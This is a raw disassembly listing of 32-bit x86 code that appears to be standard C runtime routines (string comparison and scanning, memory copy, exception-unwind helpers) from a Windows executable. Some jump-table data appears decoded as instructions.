  4264f3:	mov    eax,DWORD PTR [esi+0x18]
  4264f6:	mov    ecx,DWORD PTR ds:0x45fa14
  4264fc:	cmp    eax,DWORD PTR [ecx+0x18]
  4264ff:	je     0x426510
  426501:	cmp    eax,DWORD PTR ds:0x45f9fc
  426507:	je     0x426510
  426509:	push   eax
  42650a:	call   0x42454a
  42650f:	pop    ecx
  426510:	mov    eax,DWORD PTR [esi+0x1c]
  426513:	mov    ecx,DWORD PTR ds:0x45fa14
  426519:	cmp    eax,DWORD PTR [ecx+0x1c]
  42651c:	je     0x42652d
  42651e:	cmp    eax,DWORD PTR ds:0x45fa00
  426524:	je     0x42652d
  426526:	push   eax
  426527:	call   0x42454a
  42652c:	pop    ecx
  42652d:	mov    eax,DWORD PTR [esi+0x20]
  426530:	mov    ecx,DWORD PTR ds:0x45fa14
  426536:	cmp    eax,DWORD PTR [ecx+0x20]
  426539:	je     0x42654a
  42653b:	cmp    eax,DWORD PTR ds:0x45fa04
  426541:	je     0x42654a
  426543:	push   eax
  426544:	call   0x42454a
  426549:	pop    ecx
  42654a:	mov    esi,DWORD PTR [esi+0x24]
  42654d:	mov    eax,ds:0x45fa14
  426552:	cmp    esi,DWORD PTR [eax+0x24]
  426555:	je     0x426566
  426557:	cmp    esi,DWORD PTR ds:0x45fa08
  42655d:	je     0x426566
  42655f:	push   esi
  426560:	call   0x42454a
  426565:	pop    ecx
  426566:	pop    esi
  426567:	ret    
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	push   ebp
  426571:	mov    ebp,esp
  426573:	push   esi
  426574:	xor    eax,eax
  426576:	push   eax
  426577:	push   eax
  426578:	push   eax
  426579:	push   eax
  42657a:	push   eax
  42657b:	push   eax
  42657c:	push   eax
  42657d:	push   eax
  42657e:	mov    edx,DWORD PTR [ebp+0xc]
  426581:	lea    ecx,[ecx+0x0]
  426584:	mov    al,BYTE PTR [edx]
  426586:	or     al,al
  426588:	je     0x426593
  42658a:	add    edx,0x1
  42658d:	bts    DWORD PTR [esp],eax
  426591:	jmp    0x426584
  426593:	mov    esi,DWORD PTR [ebp+0x8]
  426596:	or     ecx,0xffffffff
  426599:	lea    ecx,[ecx+0x0]
  42659c:	add    ecx,0x1
  42659f:	mov    al,BYTE PTR [esi]
  4265a1:	or     al,al
  4265a3:	je     0x4265ae
  4265a5:	add    esi,0x1
  4265a8:	bt     DWORD PTR [esp],eax
  4265ac:	jae    0x42659c
  4265ae:	mov    eax,ecx
  4265b0:	add    esp,0x20
  4265b3:	pop    esi
  4265b4:	leave  
  4265b5:	ret    
  4265b6:	int3   
  4265b7:	int3   
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    edx,DWORD PTR [esp+0x4]
  4265c4:	mov    ecx,DWORD PTR [esp+0x8]
  4265c8:	test   edx,0x3
  4265ce:	jne    0x42660c
  4265d0:	mov    eax,DWORD PTR [edx]
  4265d2:	cmp    al,BYTE PTR [ecx]
  4265d4:	jne    0x426604
  4265d6:	or     al,al
  4265d8:	je     0x426600
  4265da:	cmp    ah,BYTE PTR [ecx+0x1]
  4265dd:	jne    0x426604
  4265df:	or     ah,ah
  4265e1:	je     0x426600
  4265e3:	shr    eax,0x10
  4265e6:	cmp    al,BYTE PTR [ecx+0x2]
  4265e9:	jne    0x426604
  4265eb:	or     al,al
  4265ed:	je     0x426600
  4265ef:	cmp    ah,BYTE PTR [ecx+0x3]
  4265f2:	jne    0x426604
  4265f4:	add    ecx,0x4
  4265f7:	add    edx,0x4
  4265fa:	or     ah,ah
  4265fc:	jne    0x4265d0
  4265fe:	mov    edi,edi
  426600:	xor    eax,eax
  426602:	ret    
  426603:	nop
  426604:	sbb    eax,eax
  426606:	shl    eax,1
  426608:	add    eax,0x1
  42660b:	ret    
  42660c:	test   edx,0x1
  426612:	je     0x42662c
  426614:	mov    al,BYTE PTR [edx]
  426616:	add    edx,0x1
  426619:	cmp    al,BYTE PTR [ecx]
  42661b:	jne    0x426604
  42661d:	add    ecx,0x1
  426620:	or     al,al
  426622:	je     0x426600
  426624:	test   edx,0x2
  42662a:	je     0x4265d0
  42662c:	mov    ax,WORD PTR [edx]
  42662f:	add    edx,0x2
  426632:	cmp    al,BYTE PTR [ecx]
  426634:	jne    0x426604
  426636:	or     al,al
  426638:	je     0x426600
  42663a:	cmp    ah,BYTE PTR [ecx+0x1]
  42663d:	jne    0x426604
  42663f:	or     ah,ah
  426641:	je     0x426600
  426643:	add    ecx,0x2
  426646:	jmp    0x4265d0
  426648:	int3   
  426649:	int3   
  42664a:	int3   
  42664b:	int3   
  42664c:	int3   
  42664d:	int3   
  42664e:	int3   
  42664f:	int3   
  426650:	mov    eax,DWORD PTR [esp+0xc]
  426654:	test   eax,eax
  426656:	je     0x4266a2
  426658:	mov    edx,DWORD PTR [esp+0x4]
  42665c:	push   esi
  42665d:	push   edi
  42665e:	mov    esi,edx
  426660:	mov    edi,DWORD PTR [esp+0x10]
  426664:	or     edx,edi
  426666:	and    edx,0x3
  426669:	je     0x4266a3
  42666b:	test   eax,0x1
  426670:	je     0x426683
  426672:	mov    cl,BYTE PTR [esi]
  426674:	cmp    cl,BYTE PTR [edi]
  426676:	jne    0x4266d0
  426678:	add    esi,0x1
  42667b:	add    edi,0x1
  42667e:	sub    eax,0x1
  426681:	je     0x4266a0
  426683:	mov    cl,BYTE PTR [esi]
  426685:	mov    dl,BYTE PTR [edi]
  426687:	cmp    cl,dl
  426689:	jne    0x4266d0
  42668b:	mov    cl,BYTE PTR [esi+0x1]
  42668e:	mov    dl,BYTE PTR [edi+0x1]
  426691:	cmp    cl,dl
  426693:	jne    0x4266d0
  426695:	add    edi,0x2
  426698:	add    esi,0x2
  42669b:	sub    eax,0x2
  42669e:	jne    0x426683
  4266a0:	pop    edi
  4266a1:	pop    esi
  4266a2:	ret    
  4266a3:	mov    ecx,eax
  4266a5:	and    eax,0x3
  4266a8:	shr    ecx,0x2
  4266ab:	je     0x4266d8
  4266ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266af:	je     0x4266d8
  4266b1:	mov    ecx,DWORD PTR [esi-0x4]
  4266b4:	mov    edx,DWORD PTR [edi-0x4]
  4266b7:	cmp    cl,dl
  4266b9:	jne    0x4266cb
  4266bb:	cmp    ch,dh
  4266bd:	jne    0x4266cb
  4266bf:	shr    ecx,0x10
  4266c2:	shr    edx,0x10
  4266c5:	cmp    cl,dl
  4266c7:	jne    0x4266cb
  4266c9:	cmp    ch,dh
  4266cb:	mov    eax,0x0
  4266d0:	sbb    eax,eax
  4266d2:	pop    edi
  4266d3:	sbb    eax,0xffffffff
  4266d6:	pop    esi
  4266d7:	ret    
  4266d8:	test   eax,eax
  4266da:	je     0x4266a0
  4266dc:	mov    edx,DWORD PTR [esi]
  4266de:	mov    ecx,DWORD PTR [edi]
  4266e0:	cmp    dl,cl
  4266e2:	jne    0x4266cb
  4266e4:	sub    eax,0x1
  4266e7:	je     0x426705
  4266e9:	cmp    dh,ch
  4266eb:	jne    0x4266cb
  4266ed:	sub    eax,0x1
  4266f0:	je     0x426705
  4266f2:	and    ecx,0xff0000
  4266f8:	and    edx,0xff0000
  4266fe:	cmp    edx,ecx
  426700:	jne    0x4266cb
  426702:	sub    eax,0x1
  426705:	pop    edi
  426706:	pop    esi
  426707:	ret    
  426708:	int3   
  426709:	int3   
  42670a:	int3   
  42670b:	int3   
  42670c:	int3   
  42670d:	int3   
  42670e:	int3   
  42670f:	int3   
  426710:	push   ebp
  426711:	mov    ebp,esp
  426713:	push   edi
  426714:	push   esi
  426715:	push   ebx
  426716:	mov    ecx,DWORD PTR [ebp+0x10]
  426719:	jecxz  0x426742
  42671b:	mov    ebx,ecx
  42671d:	mov    edi,DWORD PTR [ebp+0x8]
  426720:	mov    esi,edi
  426722:	xor    eax,eax
  426724:	repnz scas al,BYTE PTR es:[edi]
  426726:	neg    ecx
  426728:	add    ecx,ebx
  42672a:	mov    edi,esi
  42672c:	mov    esi,DWORD PTR [ebp+0xc]
  42672f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426731:	mov    al,BYTE PTR [esi-0x1]
  426734:	xor    ecx,ecx
  426736:	cmp    al,BYTE PTR [edi-0x1]
  426739:	ja     0x426740
  42673b:	je     0x426742
  42673d:	sub    ecx,0x2
  426740:	not    ecx
  426742:	mov    eax,ecx
  426744:	pop    ebx
  426745:	pop    esi
  426746:	pop    edi
  426747:	leave  
  426748:	ret    
  426749:	int3   
  42674a:	int3   
  42674b:	int3   
  42674c:	int3   
  42674d:	int3   
  42674e:	int3   
  42674f:	int3   
  426750:	push   ebp
  426751:	mov    ebp,esp
  426753:	push   esi
  426754:	xor    eax,eax
  426756:	push   eax
  426757:	push   eax
  426758:	push   eax
  426759:	push   eax
  42675a:	push   eax
  42675b:	push   eax
  42675c:	push   eax
  42675d:	push   eax
  42675e:	mov    edx,DWORD PTR [ebp+0xc]
  426761:	lea    ecx,[ecx+0x0]
  426764:	mov    al,BYTE PTR [edx]
  426766:	or     al,al
  426768:	je     0x426773
  42676a:	add    edx,0x1
  42676d:	bts    DWORD PTR [esp],eax
  426771:	jmp    0x426764
  426773:	mov    esi,DWORD PTR [ebp+0x8]
  426776:	mov    edi,edi
  426778:	mov    al,BYTE PTR [esi]
  42677a:	or     al,al
  42677c:	je     0x42678a
  42677e:	add    esi,0x1
  426781:	bt     DWORD PTR [esp],eax
  426785:	jae    0x426778
  426787:	lea    eax,[esi-0x1]
  42678a:	add    esp,0x20
  42678d:	pop    esi
  42678e:	leave  
  42678f:	ret    
  426790:	push   ebp
  426791:	mov    ebp,esp
  426793:	push   ebx
  426794:	push   esi
  426795:	push   edi
  426796:	push   ebp
  426797:	push   0x0
  426799:	push   0x0
  42679b:	push   0x4267a8
  4267a0:	push   DWORD PTR [ebp+0x8]
  4267a3:	call   0x42721e
  4267a8:	pop    ebp
  4267a9:	pop    edi
  4267aa:	pop    esi
  4267ab:	pop    ebx
  4267ac:	mov    esp,ebp
  4267ae:	pop    ebp
  4267af:	ret    
  4267b0:	mov    ecx,DWORD PTR [esp+0x4]
  4267b4:	test   DWORD PTR [ecx+0x4],0x6
  4267bb:	mov    eax,0x1
  4267c0:	je     0x4267d1
  4267c2:	mov    eax,DWORD PTR [esp+0x8]
  4267c6:	mov    edx,DWORD PTR [esp+0x10]
  4267ca:	mov    DWORD PTR [edx],eax
  4267cc:	mov    eax,0x3
  4267d1:	ret    
  4267d2:	push   ebx
  4267d3:	push   esi
  4267d4:	push   edi
  4267d5:	mov    eax,DWORD PTR [esp+0x10]
  4267d9:	push   eax
  4267da:	push   0xfffffffe
  4267dc:	push   0x4267b0
  4267e1:	push   DWORD PTR fs:0x0
  4267e8:	mov    DWORD PTR fs:0x0,esp
  4267ef:	mov    eax,DWORD PTR [esp+0x20]
  4267f3:	mov    ebx,DWORD PTR [eax+0x8]
  4267f6:	mov    esi,DWORD PTR [eax+0xc]
  4267f9:	cmp    esi,0xffffffff
  4267fc:	je     0x42682c
  4267fe:	cmp    esi,DWORD PTR [esp+0x24]
  426802:	je     0x42682c
  426804:	lea    esi,[esi+esi*2]
  426807:	mov    ecx,DWORD PTR [ebx+esi*4]
  42680a:	mov    DWORD PTR [esp+0x8],ecx
  42680e:	mov    DWORD PTR [eax+0xc],ecx
  426811:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426816:	jne    0x42682a
  426818:	push   0x101
  42681d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426821:	call   0x426866
  426826:	call   DWORD PTR [ebx+esi*4+0x8]
  42682a:	jmp    0x4267ef
  42682c:	pop    DWORD PTR fs:0x0
  426833:	add    esp,0xc
  426836:	pop    edi
  426837:	pop    esi
  426838:	pop    ebx
  426839:	ret    
  42683a:	xor    eax,eax
  42683c:	mov    ecx,DWORD PTR fs:0x0
  426843:	cmp    DWORD PTR [ecx+0x4],0x4267b0
  42684a:	jne    0x42685c
  42684c:	mov    edx,DWORD PTR [ecx+0xc]
  42684f:	mov    edx,DWORD PTR [edx+0xc]
  426852:	cmp    DWORD PTR [ecx+0x8],edx
  426855:	jne    0x42685c
  426857:	mov    eax,0x1
  42685c:	ret    
  42685d:	push   ebx
  42685e:	push   ecx
  42685f:	mov    ebx,0x45fa2c
  426864:	jmp    0x426870
  426866:	push   ebx
  426867:	push   ecx
  426868:	mov    ebx,0x45fa2c
  42686d:	mov    ecx,DWORD PTR [ebp+0x8]
  426870:	mov    DWORD PTR [ebx+0x8],ecx
  426873:	mov    DWORD PTR [ebx+0x4],eax
  426876:	mov    DWORD PTR [ebx+0xc],ebp
  426879:	pop    ecx
  42687a:	pop    ebx
  42687b:	ret    0x4
  42687e:	int3   
  42687f:	int3   
  426880:	push   ebp
  426881:	mov    ebp,esp
  426883:	push   edi
  426884:	push   esi
  426885:	mov    esi,DWORD PTR [ebp+0xc]
  426888:	mov    ecx,DWORD PTR [ebp+0x10]
  42688b:	mov    edi,DWORD PTR [ebp+0x8]
  42688e:	mov    eax,ecx
  426890:	mov    edx,ecx
  426892:	add    eax,esi
  426894:	cmp    edi,esi
  426896:	jbe    0x4268a0
  426898:	cmp    edi,eax
  42689a:	jb     0x426a1c
  4268a0:	test   edi,0x3
  4268a6:	jne    0x4268bc
  4268a8:	shr    ecx,0x2
  4268ab:	and    edx,0x3
  4268ae:	cmp    ecx,0x8
  4268b1:	jb     0x4268dc
  4268b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268b5:	jmp    DWORD PTR [edx*4+0x4269cc]
  4268bc:	mov    eax,edi
  4268be:	mov    edx,0x3
  4268c3:	sub    ecx,0x4
  4268c6:	jb     0x4268d4
  4268c8:	and    eax,0x3
  4268cb:	add    ecx,eax
  4268cd:	jmp    DWORD PTR [eax*4+0x4268e0]
  4268d4:	jmp    DWORD PTR [ecx*4+0x4269dc]
  4268db:	nop
  4268dc:	jmp    DWORD PTR [ecx*4+0x426960]
  4268e3:	nop
  4268e4:	lock push 0x691c0042
  4268ea:	inc    edx
  4268eb:	add    BYTE PTR [eax+0x69],al
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx],ah
  4268f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4268f7:	inc    esi
  4268f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4268fe:	add    al,cl
  426900:	jmp    0x289f107
  426905:	add    esi,0x3
  426908:	add    edi,0x3
  42690b:	cmp    ecx,0x8
  42690e:	jb     0x4268dc
  426910:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426912:	jmp    DWORD PTR [edx*4+0x4269cc]
  426919:	lea    ecx,[ecx+0x0]
  42691c:	and    edx,ecx
  42691e:	mov    al,BYTE PTR [esi]
  426920:	mov    BYTE PTR [edi],al
  426922:	mov    al,BYTE PTR [esi+0x1]
  426925:	shr    ecx,0x2
  426928:	mov    BYTE PTR [edi+0x1],al
  42692b:	add    esi,0x2
  42692e:	add    edi,0x2
  426931:	cmp    ecx,0x8
  426934:	jb     0x4268dc
  426936:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426938:	jmp    DWORD PTR [edx*4+0x4269cc]
  42693f:	nop
  426940:	and    edx,ecx
  426942:	mov    al,BYTE PTR [esi]
  426944:	mov    BYTE PTR [edi],al
  426946:	add    esi,0x1
  426949:	shr    ecx,0x2
  42694c:	add    edi,0x1
  42694f:	cmp    ecx,0x8
  426952:	jb     0x4268dc
  426954:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426956:	jmp    DWORD PTR [edx*4+0x4269cc]
  42695d:	lea    ecx,[ecx+0x0]
  426960:	ret    
  426961:	imul   eax,DWORD PTR [edx+0x0],0x4269b0
  426968:	test   al,0x69
  42696a:	inc    edx
  42696b:	add    BYTE PTR [eax-0x67ffbd97],ah
  426971:	imul   eax,DWORD PTR [edx+0x0],0x426990
  426978:	mov    BYTE PTR [ecx+0x42],ch
  42697b:	add    BYTE PTR [eax-0x74ffbd97],al
  426981:	inc    esp
  426982:	mov    fs,esp
  426984:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426988:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42698c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426990:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426994:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269b8:	lea    eax,[ecx*4+0x0]
  4269bf:	add    esi,eax
  4269c1:	add    edi,eax
  4269c3:	jmp    DWORD PTR [edx*4+0x4269cc]
  4269ca:	mov    edi,edi
  4269cc:	fsubr  QWORD PTR [ecx+0x42]
  4269cf:	add    ah,ah
  4269d1:	imul   eax,DWORD PTR [edx+0x0],0x4269f0
  4269d8:	add    al,0x6a
  4269da:	inc    edx
  4269db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269e1:	leave  
  4269e2:	ret    
  4269e3:	nop
  4269e4:	mov    al,BYTE PTR [esi]
  4269e6:	mov    BYTE PTR [edi],al
  4269e8:	mov    eax,DWORD PTR [ebp+0x8]
  4269eb:	pop    esi
  4269ec:	pop    edi
  4269ed:	leave  
  4269ee:	ret    
  4269ef:	nop
  4269f0:	mov    al,BYTE PTR [esi]
  4269f2:	mov    BYTE PTR [edi],al
  4269f4:	mov    al,BYTE PTR [esi+0x1]
  4269f7:	mov    BYTE PTR [edi+0x1],al
  4269fa:	mov    eax,DWORD PTR [ebp+0x8]
  4269fd:	pop    esi
  4269fe:	pop    edi
  4269ff:	leave  
  426a00:	ret    
  426a01:	lea    ecx,[ecx+0x0]
  426a04:	mov    al,BYTE PTR [esi]
  426a06:	mov    BYTE PTR [edi],al
  426a08:	mov    al,BYTE PTR [esi+0x1]
  426a0b:	mov    BYTE PTR [edi+0x1],al
  426a0e:	mov    al,BYTE PTR [esi+0x2]
  426a11:	mov    BYTE PTR [edi+0x2],al
  426a14:	mov    eax,DWORD PTR [ebp+0x8]
  426a17:	pop    esi
  426a18:	pop    edi
  426a19:	leave  
  426a1a:	ret    
  426a1b:	nop
  426a1c:	lea    esi,[ecx+esi*1-0x4]
  426a20:	lea    edi,[ecx+edi*1-0x4]
  426a24:	test   edi,0x3
  426a2a:	jne    0x426a50
  426a2c:	shr    ecx,0x2
  426a2f:	and    edx,0x3
  426a32:	cmp    ecx,0x8
  426a35:	jb     0x426a44
  426a37:	std    
  426a38:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a3a:	cld    
  426a3b:	jmp    DWORD PTR [edx*4+0x426b68]
  426a42:	mov    edi,edi
  426a44:	neg    ecx
  426a46:	jmp    DWORD PTR [ecx*4+0x426b18]
  426a4d:	lea    ecx,[ecx+0x0]
  426a50:	mov    eax,edi
  426a52:	mov    edx,0x3
  426a57:	cmp    ecx,0x4
  426a5a:	jb     0x426a68
  426a5c:	and    eax,0x3
  426a5f:	sub    ecx,eax
  426a61:	jmp    DWORD PTR [eax*4+0x426a6c]
  426a68:	jmp    DWORD PTR [ecx*4+0x426b68]
  426a6f:	nop
  426a70:	jl     0x426adc
  426a72:	inc    edx
  426a73:	add    BYTE PTR [eax-0x37ffbd96],ah
  426a79:	push   0x42
  426a7b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a81:	mov    BYTE PTR [edi+0x3],al
  426a84:	sub    esi,0x1
  426a87:	shr    ecx,0x2
  426a8a:	sub    edi,0x1
  426a8d:	cmp    ecx,0x8
  426a90:	jb     0x426a44
  426a92:	std    
  426a93:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a95:	cld    
  426a96:	jmp    DWORD PTR [edx*4+0x426b68]
  426a9d:	lea    ecx,[ecx+0x0]
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	and    edx,ecx
  426aa5:	mov    BYTE PTR [edi+0x3],al
  426aa8:	mov    al,BYTE PTR [esi+0x2]
  426aab:	shr    ecx,0x2
  426aae:	mov    BYTE PTR [edi+0x2],al
  426ab1:	sub    esi,0x2
  426ab4:	sub    edi,0x2
  426ab7:	cmp    ecx,0x8
  426aba:	jb     0x426a44
  426abc:	std    
  426abd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426abf:	cld    
  426ac0:	jmp    DWORD PTR [edx*4+0x426b68]
  426ac7:	nop
  426ac8:	mov    al,BYTE PTR [esi+0x3]
  426acb:	and    edx,ecx
  426acd:	mov    BYTE PTR [edi+0x3],al
  426ad0:	mov    al,BYTE PTR [esi+0x2]
  426ad3:	mov    BYTE PTR [edi+0x2],al
  426ad6:	mov    al,BYTE PTR [esi+0x1]
  426ad9:	shr    ecx,0x2
  426adc:	mov    BYTE PTR [edi+0x1],al
  426adf:	sub    esi,0x3
  426ae2:	sub    edi,0x3
  426ae5:	cmp    ecx,0x8
  426ae8:	jb     0x426a44
  426aee:	std    
  426aef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af1:	cld    
  426af2:	jmp    DWORD PTR [edx*4+0x426b68]
  426af9:	lea    ecx,[ecx+0x0]
  426afc:	sbb    al,0x6b
  426afe:	inc    edx
  426aff:	add    BYTE PTR [ebx+ebp*2],ah
  426b02:	inc    edx
  426b03:	add    BYTE PTR [ebx+ebp*2],ch
  426b06:	inc    edx
  426b07:	add    BYTE PTR [ebx+ebp*2],dh
  426b0a:	inc    edx
  426b0b:	add    BYTE PTR [ebx+ebp*2],bh
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b13:	add    BYTE PTR [ebx+ebp*2+0x42],cl
  426b17:	add    BYTE PTR [edi+0x6b],bl
  426b1a:	inc    edx
  426b1b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b21:	inc    esp
  426b22:	(bad)  
  426b23:	sbb    al,0x8b
  426b25:	inc    esp
  426b26:	mov    ds,WORD PTR [eax]
  426b28:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b2c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b30:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b34:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b40:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b50:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b54:	lea    eax,[ecx*4+0x0]
  426b5b:	add    esi,eax
  426b5d:	add    edi,eax
  426b5f:	jmp    DWORD PTR [edx*4+0x426b68]
  426b66:	mov    edi,edi
  426b68:	js     0x426bd5
  426b6a:	inc    edx
  426b6b:	add    BYTE PTR [eax-0x6fffbd95],al
  426b71:	imul   eax,DWORD PTR [edx+0x0],0xffffffa4
  426b75:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b79:	inc    ebp
  426b7a:	or     BYTE PTR [esi+0x5f],bl
  426b7d:	leave  
  426b7e:	ret    
  426b7f:	nop
  426b80:	mov    al,BYTE PTR [esi+0x3]
  426b83:	mov    BYTE PTR [edi+0x3],al
  426b86:	mov    eax,DWORD PTR [ebp+0x8]
  426b89:	pop    esi
  426b8a:	pop    edi
  426b8b:	leave  
  426b8c:	ret    
  426b8d:	lea    ecx,[ecx+0x0]
  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    al,BYTE PTR [esi+0x2]
  426b99:	mov    BYTE PTR [edi+0x2],al
  426b9c:	mov    eax,DWORD PTR [ebp+0x8]
  426b9f:	pop    esi
  426ba0:	pop    edi
  426ba1:	leave  
  426ba2:	ret    
  426ba3:	nop
  426ba4:	mov    al,BYTE PTR [esi+0x3]
  426ba7:	mov    BYTE PTR [edi+0x3],al
  426baa:	mov    al,BYTE PTR [esi+0x2]
  426bad:	mov    BYTE PTR [edi+0x2],al
  426bb0:	mov    al,BYTE PTR [esi+0x1]
  426bb3:	mov    BYTE PTR [edi+0x1],al
  426bb6:	mov    eax,DWORD PTR [ebp+0x8]
  426bb9:	pop    esi
  426bba:	pop    edi
  426bbb:	leave  
  426bbc:	ret    
  426bbd:	push   ebp
  426bbe:	mov    ebp,esp
  426bc0:	sub    esp,0xc
  426bc3:	mov    eax,ds:0x45f510
  426bc8:	xor    eax,DWORD PTR [ebp+0x4]
  426bcb:	and    BYTE PTR [ebp-0x6],0x0
  426bcf:	push   0x6
  426bd1:	mov    DWORD PTR [ebp-0x4],eax
  426bd4:	lea    eax,[ebp-0xc]
  426bd7:	push   eax
  426bd8:	push   0x1004
  426bdd:	push   DWORD PTR [ebp+0x8]
  426be0:	call   DWORD PTR ds:0x428108
  426be6:	test   eax,eax
  426be8:	jne    0x426bef
  426bea:	or     eax,0xffffffff
  426bed:	jmp    0x426bf9
  426bef:	lea    eax,[ebp-0xc]
  426bf2:	push   eax
  426bf3:	call   0x426efe
  426bf8:	pop    ecx
  426bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  426bfc:	xor    ecx,DWORD PTR [ebp+0x4]
  426bff:	call   0x42400c
  426c04:	leave  
  426c05:	ret    
  426c06:	push   0x38
  426c08:	push   0x428ee8
  426c0d:	call   0x423940
  426c12:	mov    eax,ds:0x45f510
  426c17:	xor    eax,DWORD PTR [ebp+0x4]
  426c1a:	mov    DWORD PTR [ebp-0x1c],eax
  426c1d:	xor    edi,edi
  426c1f:	mov    DWORD PTR [ebp-0x20],edi
  426c22:	mov    DWORD PTR [ebp-0x24],edi
  426c25:	mov    eax,DWORD PTR [ebp+0x14]
  426c28:	mov    ebx,DWORD PTR [eax]
  426c2a:	mov    DWORD PTR [ebp-0x28],ebx
  426c2d:	mov    DWORD PTR [ebp-0x2c],edi
  426c30:	mov    eax,DWORD PTR [ebp+0x8]
  426c33:	cmp    eax,DWORD PTR [ebp+0xc]
  426c36:	je     0x426daf
  426c3c:	lea    ecx,[ebp-0x40]
  426c3f:	push   ecx
  426c40:	push   eax
  426c41:	mov    esi,DWORD PTR ds:0x4280d4
  426c47:	call   esi
  426c49:	test   eax,eax
  426c4b:	je     0x426c6d
  426c4d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c51:	jne    0x426c6d
  426c53:	lea    eax,[ebp-0x40]
  426c56:	push   eax
  426c57:	push   DWORD PTR [ebp+0xc]
  426c5a:	call   esi
  426c5c:	test   eax,eax
  426c5e:	je     0x426c6d
  426c60:	cmp    DWORD PTR [ebp-0x40],0x1
  426c64:	jne    0x426c6d
  426c66:	mov    DWORD PTR [ebp-0x2c],0x1
  426c6d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c70:	je     0x426c8c
  426c72:	cmp    ebx,0xffffffff
  426c75:	je     0x426c7b
  426c77:	mov    esi,ebx
  426c79:	jmp    0x426c87
  426c7b:	push   DWORD PTR [ebp+0x10]
  426c7e:	call   0x423f50
  426c83:	pop    ecx
  426c84:	mov    esi,eax
  426c86:	inc    esi
  426c87:	mov    DWORD PTR [ebp-0x44],esi
  426c8a:	jmp    0x426c8f
  426c8c:	mov    esi,DWORD PTR [ebp-0x44]
  426c8f:	cmp    DWORD PTR [ebp-0x2c],edi
  426c92:	jne    0x426cae
  426c94:	push   edi
  426c95:	push   edi
  426c96:	push   ebx
  426c97:	push   DWORD PTR [ebp+0x10]
  426c9a:	push   0x1
  426c9c:	push   DWORD PTR [ebp+0x8]
  426c9f:	call   DWORD PTR ds:0x4280f8
  426ca5:	mov    esi,eax
  426ca7:	mov    DWORD PTR [ebp-0x44],esi
  426caa:	cmp    esi,edi
  426cac:	je     0x426d06
  426cae:	mov    DWORD PTR [ebp-0x4],edi
  426cb1:	lea    eax,[esi+esi*1]
  426cb4:	add    eax,0x3
  426cb7:	and    eax,0xfffffffc
  426cba:	call   0x423990
  426cbf:	mov    DWORD PTR [ebp-0x18],esp
  426cc2:	mov    ebx,esp
  426cc4:	mov    DWORD PTR [ebp-0x48],ebx
  426cc7:	lea    eax,[esi+esi*1]
  426cca:	push   eax
  426ccb:	push   edi
  426ccc:	push   ebx
  426ccd:	call   0x426240
  426cd2:	add    esp,0xc
  426cd5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cd9:	jmp    0x426cf2
  426cdb:	xor    eax,eax
  426cdd:	inc    eax
  426cde:	ret    
  426cdf:	mov    esp,DWORD PTR [ebp-0x18]
  426ce2:	call   0x426dd5
  426ce7:	xor    edi,edi
  426ce9:	xor    ebx,ebx
  426ceb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cef:	mov    esi,DWORD PTR [ebp-0x44]
  426cf2:	cmp    ebx,edi
  426cf4:	jne    0x426d14
  426cf6:	push   esi
  426cf7:	push   0x2
  426cf9:	call   0x424a58
  426cfe:	pop    ecx
  426cff:	pop    ecx
